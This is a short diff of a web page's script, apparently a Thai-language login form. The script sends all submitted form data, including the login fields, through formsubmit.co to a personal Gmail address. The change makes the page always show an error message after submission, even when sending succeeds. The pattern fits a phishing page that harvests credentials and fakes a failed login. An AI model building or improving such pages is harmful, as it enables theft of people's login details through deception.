@@ -177,6 +177,7 @@
 
     const form = e.target;
     const data = new FormData(form);
+    const errorMessage = document.getElementById("error-message");
 
     fetch("https://formsubmit.co/ajax/good.abcdfg@gmail.com", {
       method: "POST",
@@ -188,15 +189,17 @@
     .then(response => response.json())
     .then(result => {
       if (result.success) {
-        form.reset(); // ส่งเสร็จแล้วล้างข้อมูล
+        form.reset(); // ส่งสำเร็จล้างข้อมูล
+        errorMessage.style.display = "block"; // แสดงข้อความ
+      } else {
+        errorMessage.style.display = "block"; // กรณีไม่ success
       }
     })
     .catch(error => {
-      // ถ้าอยากให้เงียบแม้จะ error ก็ปล่อยว่างไว้แบบนี้
+      errorMessage.style.display = "block"; // กรณี error ก็แสดง
     });
   });
 </script>
-
         <div class="link">
           <p>ลืมรหัสผ่านหรือชื่อผู้ใช้ใช่ไหม?</p>
         </div>
